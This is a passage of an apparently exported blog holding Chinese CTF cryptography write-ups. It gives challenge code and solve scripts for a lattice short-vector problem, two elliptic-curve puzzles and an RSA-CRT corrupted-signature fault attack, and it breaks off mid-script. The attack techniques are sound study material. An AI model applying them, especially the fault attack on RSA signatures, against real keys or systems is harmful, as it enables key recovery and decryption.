的集合。</p>\n</blockquote>\n<p>那么就不难看出有 $BD^T=O$ ，即 $B^TD=O$<br>至于 $C$ 为什么左边要拼接一个单位阵，回忆你已经遗忘的线性代数，这种操作是不是似曾相识？没错说的就是矩阵的求逆，求逆矩阵除了伴随矩阵法，还有一种方法就是初等变换法。<br>例如如下一个矩阵求逆<br>$$<br>M=<br>\\begin{pmatrix}<br>1 &amp; -4 &amp; -3 \\\\<br>1 &amp; -5 &amp; -3 \\\\<br>-1 &amp; 6 &amp; 4<br>\\end{pmatrix}<br>$$<br>在右边补上一个单位阵，得到<br>$$<br>A=<br>\\left(<br>\\begin{array}{ccc|ccc}<br>1 &amp; -4 &amp; -3 &amp; 1 &amp; 0 &amp; 0 \\\\<br>1 &amp; -5 &amp; -3 &amp; 0 &amp; 1 &amp; 0 \\\\<br>-1 &amp; 6 &amp; 4 &amp; 0 &amp; 0 &amp; 1<br>\\end{array}<br>\\right)<br>\\stackrel{初等行变换}{\\longrightarrow}<br>\\left(<br>\\begin{array}{ccc|ccc}<br>1 &amp; 0 &amp; 0 &amp; 2 &amp; 2 &amp; 3 \\\\<br>0 &amp; 1 &amp; 0 &amp; 1 &amp; -1 &amp; 0 \\\\<br>0 &amp; 0 &amp; 1 &amp; -1 &amp; 2 &amp; 1<br>\\end{array}<br>\\right)<br>$$<br>此时右边的矩阵 $M^{-1}$ 即为所求<br>究其原理，在进行初等行变换的时候，右边的矩阵“记录”下了我们的操作，可以表示为<br>$$<br>M^{-1}<br>\\left[<br>    M\\enspace I<br>\\right] =<br>\\left[<br>    I\\enspace M^{-1}<br>\\right]<br>$$<br>回到题目中来，有<br>$$<br>L<br>\\left[<br>    I \\enspace C^T<br>\\right]<br> \\enspace % \\enspace N=<br>\\left[<br>\\begin{matrix}<br>    B &amp; O \\\\<br>    R &amp; S<br>\\end{matrix}<br>\\right]<br>$$<br>至于右上角为何是一个 $75\\times10$ 的零阵，我也不知道，但 exp 既然这么断言，姑且就这么认为先，那么我们就推测<br>$$<br>L=<br>\\left[<br>\\begin{matrix}<br>    B \\\\<br>    R<br>\\end{matrix}<br>\\right]<br>,LC^T=<br>\\left[<br>\\begin{matrix}<br>    O \\\\<br>    S<br>\\end{matrix}<br>\\right]<br>\\pmod N<br>$$<br>即有<br>$$<br>\\left[<br>\\begin{matrix}<br>    B \\\\<br>    R<br>\\end{matrix}<br>\\right]C^T=<br>\\left[<br>\\begin{matrix}<br>    O \\\\<br>    S<br>\\end{matrix}<br>\\right]\\pmod N<br>$$<br>得到 $BC^T=O\\pmod N$ ，结合上面 $BD^T=O$ ，推测。。。推测不出来了，然后结合队里大手子的分析如下</p>\n<p>记题目中给出的两个矩阵为 $\\mathcal{A}$和$\\mathcal{B}$ ，有<br> $\\mathcal{A}\\mathcal{B} = C\\pmod N$<br>若有 $B(\\mathcal{A}\\mathcal{B})^T = BC^T = O\\pmod N$ ，则 $B$ 和 $C^T$ 互为左右零空间。<br>因此可以通过构造格 $L$ ，使得对格 $L$ 进行格基规约后可以得到一组基 $B$ 满足 $BC^T = O\\pmod N$ ，即 $B$ 的基就是 $C^T$ 在模 $N$ 下的一个左零空间。<br>接下来对 $B$ 求解其零空间 $D^T$ 就得到了 $(\\mathcal{A}\\mathcal{B})^T$ 所在的那个空间上了，这里从有限域化为整数域，即 $D=\\mathcal{A}\\mathcal{B}$ ，然后因为 $\\mathcal{B}$ 中所求的行向量是一个短向量，且矩阵 $D^T$ 的行向量是 $\\mathcal{B}$ 的行向量的线性组合，因此对 $D^T$ 进行格基规约算法就可以把 $\\mathcal{B}$ 的短向量给恢复出来。</p>\n<p>至此已经有明悟的感觉，但仍是有少许不解，消化一段时间吧。</p>\n","excerpt":"<p>当场做是做不出来的，赛后分析学学吧，不定期更新。</p>","more":"<h2 id=\"Lattice\"><a href=\"#Lattice\" class=\"headerlink\" title=\"Lattice\"></a>Lattice</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sage.modules.free_module_integer <span class=\"keyword\">import</span> IntegerLattice</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> b64encode</span><br><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secret <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"><span class=\"keyword\">import</span> signal</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">75</span></span><br><span class=\"line\">m = <span class=\"number\">150</span></span><br><span class=\"line\">r = <span class=\"number\">10</span></span><br><span class=\"line\">N = <span class=\"number\">126633165554229521438977290762059361297987250739820462036000284719563379254544315991201997343356439034674007770120263341747898897565056619503383631412169301973302667340133958109</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">gen</span>(<span class=\"params\">n, m, r, N</span>):</span><br><span class=\"line\">    t1 = [ZZ.random_element(-<span class=\"number\">2</span>^<span class=\"number\">15</span>, <span class=\"number\">2</span>^<span class=\"number\">15</span>) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n*m)]</span><br><span class=\"line\">    t2 = [ZZ.random_element(N) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(r*n)]</span><br><span class=\"line\">    B = matrix(ZZ, n, m, t1)        <span class=\"comment\"># B为75*150的矩阵</span></span><br><span class=\"line\">    L = IntegerLattice(B)</span><br><span class=\"line\">    A = matrix(ZZ, r, n, t2)        <span class=\"comment\"># A为10*75的矩阵</span></span><br><span class=\"line\">    C = (A * B) % N                 <span class=\"comment\"># C为10*150的矩阵</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> L, C</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pad</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s + (<span class=\"number\">16</span> - <span class=\"built_in\">len</span>(s) % <span class=\"number\">16</span>) * <span class=\"string\">b&quot;\\x00&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">signal.alarm(<span class=\"number\">60</span>)</span><br><span class=\"line\">token = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;team token:&quot;</span>).strip().encode()</span><br><span class=\"line\">L, C = gen(n, m, r, N)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(C)</span><br><span class=\"line\">key = sha256(<span class=\"built_in\">str</span>(L.reduced_basis[<span class=\"number\">0</span>]).encode()).digest()</span><br><span class=\"line\">aes = AES.new(key, AES.MODE_ECB)</span><br><span class=\"line\">ct = b64encode(aes.encrypt(pad(flag))).decode()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ct)</span><br></pre></td></tr></table></figure>\n\n<p>题目生成了一个元素在 $[-2^{15},2^{15}]$ 间的矩阵 $B_{75\\times150}$ ，和 $Z_N$ 上的矩阵 $A_{10\\times75}$ 。然后给了一个两矩阵相乘再模 $N$ 的结果 $C$ ，即 $C=AB\\pmod N$ ，需要我们恢复出原来格$B$的最短向量。</p>\n<p>比赛时尝试过构造 $\\left[ C \\enspace NI\\right]^T$ ，跑LLL出来的结果很差， BKZ 的话一晚上啥也没出来。。<br>赛后只找到 Nu1L 队的 wp ，but 也只有个 exp ，一句解释都没，像我这样的菜鸡分析起来就十分吃力了，但聊胜于无嘛，其他几个队连个 wp 都不放呜呜呜。</p>\n<p>exp 中构造了一个 $m+r=150+10=160$ 维的方阵 $A$ 如下：<br>$$<br>A=<br>\\left(<br>\\begin{array}{cccc|cccc}<br>1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 2^{200}\\cdot c_{0,0} &amp; 2^{200}\\cdot c_{1,0} &amp; \\cdots &amp; 2^{200}\\cdot c_{9,0} \\\\<br>0 &amp; 1 &amp; \\cdots &amp; 0 &amp; 2^{200}\\cdot c_{0,1} &amp; 2^{200}\\cdot c_{1,1} &amp; \\cdots &amp; 0 \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; 0 \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 1 &amp; 2^{200}\\cdot c_{0,149} &amp; 2^{200}\\cdot c_{1,149} &amp; \\cdots &amp; 2^{200}\\cdot c_{9,149} \\\\ \\hline<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 2^{200}\\cdot N &amp; 0 &amp; \\cdots &amp; 0 \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; 2^{200}\\cdot N &amp; \\cdots &amp; 0 \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 2^{200}\\cdot N<br>\\end{array}<br>\\right)<br>$$<br>可以看到 $A$ 左上角为一个 $150$ 维的单位阵，左下角为零阵，右上角为 $C$ 的转置数乘 $2^{200}$ ，右下角为一个 $10$ 维的单位阵数乘 $2^{200}\\cdot N$ ，这里乘不乘 $2^{200}$ 得到的结果都是一样的，但神奇的是不乘的话 LLL 耗时会长一些。<br>$A$ 跑一遍 LLL 后，取结果的左上角 $75\\times150$ 矩阵，记为 $B$ ，取 $B$ 的核记为 $D$ ，最后 $D$ 跑一遍 BKZ 后的最短向量即为所求。</p>\n<blockquote>\n<p>这里涉及到矩阵的核的概念，核也叫矩阵的零空间，比如 $M$ 的核是方程 $Mx=0$ 的所有解 $x$ 的集合。</p>\n</blockquote>\n<p>那么就不难看出有 $BD^T=O$ ，即 $B^TD=O$<br>至于 $C$ 为什么左边要拼接一个单位阵，回忆你已经遗忘的线性代数，这种操作是不是似曾相识？没错说的就是矩阵的求逆，求逆矩阵除了伴随矩阵法，还有一种方法就是初等变换法。<br>例如如下一个矩阵求逆<br>$$<br>M=<br>\\begin{pmatrix}<br>1 &amp; -4 &amp; -3 \\\\<br>1 &amp; -5 &amp; -3 \\\\<br>-1 &amp; 6 &amp; 4<br>\\end{pmatrix}<br>$$<br>在右边补上一个单位阵，得到<br>$$<br>A=<br>\\left(<br>\\begin{array}{ccc|ccc}<br>1 &amp; -4 &amp; -3 &amp; 1 &amp; 0 &amp; 0 \\\\<br>1 &amp; -5 &amp; -3 &amp; 0 &amp; 1 &amp; 0 \\\\<br>-1 &amp; 6 &amp; 4 &amp; 0 &amp; 0 &amp; 1<br>\\end{array}<br>\\right)<br>\\stackrel{初等行变换}{\\longrightarrow}<br>\\left(<br>\\begin{array}{ccc|ccc}<br>1 &amp; 0 &amp; 0 &amp; 2 &amp; 2 &amp; 3 \\\\<br>0 &amp; 1 &amp; 0 &amp; 1 &amp; -1 &amp; 0 \\\\<br>0 &amp; 0 &amp; 1 &amp; -1 &amp; 2 &amp; 1<br>\\end{array}<br>\\right)<br>$$<br>此时右边的矩阵 $M^{-1}$ 即为所求<br>究其原理，在进行初等行变换的时候，右边的矩阵“记录”下了我们的操作，可以表示为<br>$$<br>M^{-1}<br>\\left[<br>    M\\enspace I<br>\\right] =<br>\\left[<br>    I\\enspace M^{-1}<br>\\right]<br>$$<br>回到题目中来，有<br>$$<br>L<br>\\left[<br>    I \\enspace C^T<br>\\right]<br> \\enspace % \\enspace N=<br>\\left[<br>\\begin{matrix}<br>    B &amp; O \\\\<br>    R &amp; S<br>\\end{matrix}<br>\\right]<br>$$<br>至于右上角为何是一个 $75\\times10$ 的零阵，我也不知道，但 exp 既然这么断言，姑且就这么认为先，那么我们就推测<br>$$<br>L=<br>\\left[<br>\\begin{matrix}<br>    B \\\\<br>    R<br>\\end{matrix}<br>\\right]<br>,LC^T=<br>\\left[<br>\\begin{matrix}<br>    O \\\\<br>    S<br>\\end{matrix}<br>\\right]<br>\\pmod N<br>$$<br>即有<br>$$<br>\\left[<br>\\begin{matrix}<br>    B \\\\<br>    R<br>\\end{matrix}<br>\\right]C^T=<br>\\left[<br>\\begin{matrix}<br>    O \\\\<br>    S<br>\\end{matrix}<br>\\right]\\pmod N<br>$$<br>得到 $BC^T=O\\pmod N$ ，结合上面 $BD^T=O$ ，推测。。。推测不出来了，然后结合队里大手子的分析如下</p>\n<p>记题目中给出的两个矩阵为 $\\mathcal{A}$和$\\mathcal{B}$ ，有<br> $\\mathcal{A}\\mathcal{B} = C\\pmod N$<br>若有 $B(\\mathcal{A}\\mathcal{B})^T = BC^T = O\\pmod N$ ，则 $B$ 和 $C^T$ 互为左右零空间。<br>因此可以通过构造格 $L$ ，使得对格 $L$ 进行格基规约后可以得到一组基 $B$ 满足 $BC^T = O\\pmod N$ ，即 $B$ 的基就是 $C^T$ 在模 $N$ 下的一个左零空间。<br>接下来对 $B$ 求解其零空间 $D^T$ 就得到了 $(\\mathcal{A}\\mathcal{B})^T$ 所在的那个空间上了，这里从有限域化为整数域，即 $D=\\mathcal{A}\\mathcal{B}$ ，然后因为 $\\mathcal{B}$ 中所求的行向量是一个短向量，且矩阵 $D^T$ 的行向量是 $\\mathcal{B}$ 的行向量的线性组合，因此对 $D^T$ 进行格基规约算法就可以把 $\\mathcal{B}$ 的短向量给恢复出来。</p>\n<p>至此已经有明悟的感觉，但仍是有少许不解，消化一段时间吧。</p>"},{"title":"2022 巅峰极客 Crypto","date":"2022-08-18T04:47:00.000Z","_content":"\n有瓜吃，美滋滋。\n<!--more-->\n\n题目质量一般，知识问答还全是搬运今年 ciscn 的。\n然后三个队友都没啥空，就我一个做了两道密码，排 88 名，对我这个菜鸡来说也还行吧。\n\n## point-power\n\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom random import *\nfrom secrets import flag\n\nassert len(flag)==42\np=getPrime(600)\na=bytes_to_long(flag)\nb=randrange(2,p-1)\nE=EllipticCurve(GF(p),[a,b])\nG=E.random_element()\n\nx1,y1,_=G\nG=2*G\nx2,y2,_=G\n\nprint(f\"p = {p}\")\nprint(f\"b = {b}\")\nprint(f\"x1 = {x1}\")\nprint(f\"x2 = {x2}\")\n'''\np = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623\nb = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147\nx1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740\nx2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727\n'''\n```\n\n这题完全是现学现卖，之前只听说过椭圆曲线，然后就跑去学抽代忘记回来了。。。\n首先查到椭圆曲线的加法（两点相同的情形）：\n$$\nx_2=m^2-2x_1\\pmod p \\ with \\ m=\\frac{3x_1^2+a}{2y_1}\n$$\n又在 Sagemath 文档查到曲线定义 $y_1^2=x_1^3+ax_1+b$ ，就能联立出一个一元二次方程，exp 如下：\n\n```python\np = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623\nb = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147\nx1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740\nx2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727\n\nK = GF(p)\nn=(K(x2+2*x1)).sqrt()\nP.<x>= PolynomialRing(K)\nA=1\nB=6*x1**2-4*n**2*x1\nC=-(4*n**2*x1**3+4*n**2*b-9*x1**4)\nf=A*x**2+B*x+C\nroots=f.roots()\nprint(roots)\nflag=roots[1][0]\nfrom Crypto.Util.number import *\nprint(long_to_bytes(int(flag)))\n```\n\n## strange curve\n\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom secrets import flag\nimport random\n\ndef add(P,Q):\n    (x1,y1)=P\n    (x2,y2)=Q\n\n\n    x3=(x1+x2)*(1+y1*y2)*invert((1+x1*x2)*(1-y1*y2),p)%p\n    y3=(y1+y2)*(1+x1*x2)*invert((1-x1*x2)*(1+y1*y2),p)%p\n\n    return (x3,y3)\n\ndef mul(e,P):\n    Q=(0,0)\n    e=e%p\n    while e:\n        if e&1:\n            Q=add(Q,P)\n        P=add(P,P)\n        e>>=1\n    return Q\n\ndef Legendre(a,p):\n    return (pow((a%p+p)%p,(p-1)//2,p))%p\n\ndef get_ts(p):\n    p=p-1\n    count=0\n    while p%2==0:\n        count+=1\n        p=p//2\n    return count,p\n\ndef get_nonre(p):\n    a=random.randint(1,p)\n    while Legendre(a,p)==1:\n        a=random.randint(1,p)\n    return a\n\ndef amm2(a,p):\n    t,s=get_ts(p)\n    ta=pow(get_nonre(p),s,p)\n    tb=pow(a,s,p)\n    h=1\n    for i in range(1,t):\n        d=pow(tb,2**t-1-i,p)\n        if d==1:\n            k=0\n        else:\n            k=1\n        tb=(tb*pow(ta,2*k,p))%p\n        h=(h*pow(ta,k,p))%p\n        ta=pow(ta,2,p)\n    return h*pow(a,(s+1)//2,p)%p  \n\ndef solve(a,b,c,p):\n    tmpa=1\n    tmpb=b*inverse(a,p)%p\n    tmpc=c*inverse(a,p)%p\n    assert Legendre(tmpb**2*inverse(4,p)-tmpc,p)==1\n    res1=(amm2(tmpb**2*inverse(4,p)-tmpc,p)-tmpb*inverse(2,p))%p\n    res2=(-amm2(tmpb**2*inverse(4,p)-tmpc,p)-tmpb*inverse(2,p))%p\n    return (res1,res2)\n\ndef lift(x,a,b,p):\n    tmp=b*(x**2-1)*inverse(a*x,p)%p\n    return solve(1,-tmp,-1,p)[0]\n\np=9410547699903726871336507117271550134683191140146415131394654141737636910570480327296351841515571767317596027931492843621727002889086193529096531342265353\na=54733430689690725746438325219044741824500093621550218736194675295708808435509\nb=75237024593957256761258687646797952793573177095902495908321724558796076392871\nx=bytes_to_long(flag)\n\nwhile True:\n    try:\n        y=lift(x,a,b,p)\n        break\n    except:\n        x+=1\n        continue\n\nassert a*x*(y**2-1)%p==b*y*(x**2-1)%p\n\nP=(x,y)\ne=65537\n\neP=mul(e,P)\nprint(f\"P = {P}\")\nprint(f\"eP = {eP}\")\n'''\nP = (56006392793427940134514899557008545913996191831278248640996846111183757392968770895731003245209281149, 5533217632352976155681815016236825302418119286774481415122941272968513081846849158651480192550482691343283818244963282636939305751909505213138032238524899)\neP = (mpz(8694229840573103722999959579565187489450818138005222030156495740841851804943200684116883831426548909867463656993852596745698999492932194245562062558787005), mpz(9279986963919197374405152604360936066932975197577643570458423456304679111057526702737279809805694360981565554506626018364382736924914907001214909905449002))\n'''\n```\n\n这题真的是蚌不住，刚放出来解出数就蹭蹭往上涨，还有点怀疑人生，然后仔细观察题目，一看上面，什么玩意，再看下面，什么玩意。。。\n直接拿第一个数 `long_to_bytes` ，得到 flag。\n\n## Learning with fault\n\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom secrets import flag\nimport os\n\nclass RSA():\n    def __init__(self,p,q,e):\n        self.p=p\n        self.q=q\n        self.e=e\n        self.phi=(p-1)*(q-1)\n        self.d=invert(self.e,self.phi)\n        self.dp=self.d%(p-1)\n        self.dq=self.d%(q-1)\n        self.n=p*q\n        self.N=getPrime(512)*getPrime(512)\n\n    def sign(self,message):\n        m=bytes_to_long(message)\n        sig_p=pow(m,self.dp,self.p)\n        sig_q=pow(m,self.dq,self.q)\n        alpha=q*invert(q,p)\n        beta=p*invert(p,q)\n        return long_to_bytes((alpha*sig_p+beta*sig_q)%self.n)\n\n    def corrupt_sign(self,message):\n        m=bytes_to_long(message)\n        sig_p=pow(m,self.dp,self.p)\n        sig_q=pow(m,self.dq,self.q)\n        alpha=q*invert(q,p)\n        beta=p*invert(p,q)\n        return long_to_bytes((alpha*sig_p+beta*sig_q)%self.N)\n\n    def verify(self,message,sign):\n        return long_to_bytes(pow(bytes_to_long(sign),self.e,self.n))==message\n\np=getPrime(512)\nq=getPrime(512)\ne=65537\nrsa=RSA(p,q,e)\n\nwith open(\"sign.txt\",\"w\") as f1:\n    with open(\"corrupted_sign.txt\",\"w\") as f2:\n        for _ in range(6):\n            message=os.urandom(64)\n            sign=rsa.sign(message)\n            corrupted_sign=rsa.corrupt_sign(message)\n            assert rsa.verify(message,sign)\n            f1.write(str(sign)+'\\n')\n            f2.write(str(corrupted_sign)+'\\n')\n\nenc=pow(bytes_to_long(flag),rsa.e,rsa.n)\nprint(f\"n = {rsa.n}\")\nprint(f\"N = {rsa.N}\")\nprint(f\"e = {rsa.e}\")\nprint(f\"enc = {enc}\")\n'''\nn = 99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729\nN = 81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731\ne = 65537\nenc = 2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396\n'''\n```\n\n出题论文：<https://eprint.iacr.org/2011/388.pdf>\n这题一开始是搜到了论文，瞟了两眼，以为不是，就没看下去了。。。\n后来学长发给我这篇，我焯了两个钟复现出来了，说不定真有机会现场解出，唉还是太菜。\n照着论文的 Attack Summary 敲就行了，一开始没理解到 $z$ 向量的意思，直接从格子拿，跑不出来，学长问我 $a$ 和 $b$ 的选取是不是有问题，我才知道要枚举出所有 $x$ 和 $y$ 。然后 $a$ 和 $b$ 在 0 到 10 间选取也不行，改成了 -10 到 10 。\nexp 如下：\n\n```python\nfrom tqdm import tqdm\nfrom itertools import combinations\nfrom sage.all import *\nfrom Crypto.Util.number import *\nco_sig = [b\"\\x17\\x8bb3\\x11\\x1b\\xb9\\xb9\\xc6M\\xb0\\xaa\\x07-\\x1ar\\xff\\xfb\\xb4&H7!\\xb8\\xa1\\xce\\x07\\x8b\\x84M\\x0bw=m\\x193Oc\\x97w\\x8f\\xffy4\\xa1\\x99\\xfcW\\xf9|\\xeb\\xa4\\x00\\x1eD*\\xe8-'\\xa9\\xef\\x9d\\x13*\\xf4\\xbe\\x9d\\x9b&w\\xcb\\xfd\\xb3\\xb6\\xa3n\\xb8\\xb4\\x97vT\\xec@\\x86\\xd1R\\xb0\\n\\xe1uC\\xbc\\x14\\xeb\\xceSu&'{\\xb9\\x12\\x90\\x82\\xc7,\\xdbr\\xebP\\xe1j\\x11E\\xd5\\x17\\xe1\\xd0D\\xe7z\\x94vt\\xbf\\x1a\\xc4+\",\n          b'\\x1dJ\\xc5\\xb2\\xbe\\x05\\xe6\\xc8T\\n\\xbe\"\\xbeU\\xed\\xba\\xec\\x85\\x05\\x8b\\x8ayE\\xa3}0\\x1dk\\xa7\\x10\\xe2E\\x19\\xfe\\x10\\x90\\xef\\r\\xdbV\\x8b\\x87|(\\xd1\\xb5\\xfd\\xb9\\x14\\x84\\x05\\x03\\x81\\xc8\\xf6\\xe5\\x8a\\x92\\xa0\\x01I\\x8aG:\\xc19\\x9e\\xf0\\x8eZ\\\\Yx\\x80|\\xb7\\x80\\x0e\\xcd\\xa3\\xba6\\xf8\\x98\\xb1pB\\x05\\x8aT#\\xbf\\x1e\\x1b~\\xcb\\xf5\\t\\xa2H9\\xc9n\\x81e\\xa2\\x15\\x97\\x11\\xe4\\x93\\xf2\\xe6\\x80\\x97\\x99G\\xb5\\xfe\\x07/\\xd2\\xbd\\xad\\xcf\\x04\\x9e\\xd0',\n          b'Gs\\xda\\xb8\\x8a\\x85\\xccK\\xf7\\xa8y\\x16\\xa5\\xf0\\x06\\xbe\\xeb\\x83&}a\\x85q\\x8d:\\x1fSb\\xb8\\xc5\\x84\\xba*[\\xe7\\xbb{\\x86\\xd3\\xb3r\\xb6\\xaaCN\\x93\\x1d<(\\xe2\\x1c;\\x8crU\\x8fD=W\\xa7\\x0b\\xc7\\xeag\\x96\\x06\\xd6\\xbb\\xe4\\x04b\\xd8\\x02\\x12\\xd6\\xfa2\\x1e#\\xf0\\xde\\x8b\\x88M\\xd2\\xf47\\\\\\x98\\xe0\\x04Fu\\x1bsy\\xf2\\xc4\\xad\\xd6Y\\x81u~B:\\xd2\\x1f\\xb3\\xab\\x01:\\xfa\\xdf\\x19J8\\xd0\\x18RN\\xfe,CA\\x15\\xb3\\xe0',\n          b\"0I\\xda5\\x9f\\x05v\\x17\\xdc\\xd4q\\xd6\\x83,\\x9d\\r\\xccc\\x8a\\xa1\\xd4U\\xd3\\x18\\xc9\\xc6g\\xcd\\nX\\x99Ah\\xed}\\xf3\\xb1(\\xd5I\\xc6\\x0f@yw9\\x9d\\xfdv\\x15x\\xeaRA\\xd6\\xb0\\x1e\\xb5B\\xe5\\x05cc\\x06m\\xf4NN'\\x02q\\x1a\\x11\\xe4\\x87P:\\xc8\\x11a\\x9f\\xbd\\x9c\\x98x\\xda\\xea\\xc4\\xa8f\\x89s\\xcaJ\\x7f\\xeb\\xd8\\xc1G#\\xf4\\xdc\\xe2\\x01\\xf2\\xa5\\x95\\x19`)2!\\xf5\\xb9\\xf0\\xf2\\xbb\\xf8\\x0bF&&`\\xfd*\\xe1\\xf2\\x9c\",\n          b':\\x99/Hxt\\xd1\\xd4\\xaaB\\xd6H\\x16\\xe1\\xc9\\xe2\\xb3\\xc3\\xa9b\\xd3\\x96\\x9c\\x05x6\\xf1\\xc3d\\xa2\\xd1U+.\\x1b\\xac^\\xf6Mh7\\xb7\\x03\\x8e\\xdc\\xca\\x0bn\\xac\\xed\\x92\\xb8x\\x04)\\x0f|\\x11\\xcc\\xfa\\xf2\\\\\\xba\\xee\\xc4X\\xa8(\\x05\\xf2\\xb5\\x8f&\\xf3\\xff\\x1eB\\xe7\\x94\\xf4\\xa6\\x00!\\xe5v\\xd9x\\xf0s\\x94\\xf4D(\\xa9g\\x118\\xa7z\\x83\\xad\\xdb\\xe6\\xe3\\xe7\\xf8\\xf2\\xef\\xe5@\\xe9\\x13\\x00OB\\xcc\\x05\\xd1,_=\\xd2/Og\\x81\\xa6+',\n          b'\\x1c|\\xb6\\xcc\\xdfj\\xc5\\xa0s\\xac w\\xa6\\xf2\\x87D\\xe3\\xf9Y\\xf5=\\xf0\\x0b\\xd9\\xea\\x89,+e\\x1e\\xb7m#\\x99\\xd1\\x87\\x17Z\\xed\\x1d\\xc8\\x97;\\xa0K\\x05.\\xaa<\\xc6s\\xcf\\xa2\\xa2\\\\PO\\x12&\\xb4\\x11\\xec\\xad\\x10\\xf8\\xf7\\xd1\\xd3_\\x80\\x17\\xe0\\x1eP\\x93\\xe3\\xc2\\x1e\\x03\\xea]^\\xc6a\\x9c\\xcb\\x90\\xbb\\x9f\\x8by\\xa5dhM\\xce\\xc7\\xbc\\xf7\\xafe\\xcf\\xc1\\xf1\\x18@\\x1e\\xe2\\xdb\\xfb\\xe4^\\xc8\\xe7\\x19\\xccnY\\xc6o\\x7fL\\x9fV\\xd4\\xc4\\x15\\xe8',\n          ]\nsig = [b'\\t\\x8b\\xde\\x98\\x84\\x1d\\x9e\\xd4\\xa0\\xb7f\\xe0\\x05\\xb1\\xbd8\\xb9G\\xe3\\x0c\\x83\\x8a\\xe5\\xf0G7\\x12\\x1eT\\x85o-B\\xe4_\\xd2\\x04\\xd9:\\xab\\xdf\\xa1 \\x8f\\xedt+\\x0f\\xce\\xb5\\x90\\xaaK\\xf0U~v=\\x84\\xe7$G\\xf5\\xfb\\xd3ok~V\\x1a\\xec&\\x15\\x18Y\\x0c\\x80u\\xafF\\xf1\\x10\\x9f\\xf2\\xe6\\xa6\\x9a\\xbb\\xbd+\\xa4l\\xa9\\x11\\xd5\\t\\x13\\x16\\xa3\\xde\\xe1\\xdfZ\\xa9$r\\xb5`\\xc9\"\\x11\\xab\\xc5\\x87\\xc4\\x1d@\\x9e\\xa4t\\xdb#\\xbdj\\xcb\\x95\\xefK',\n       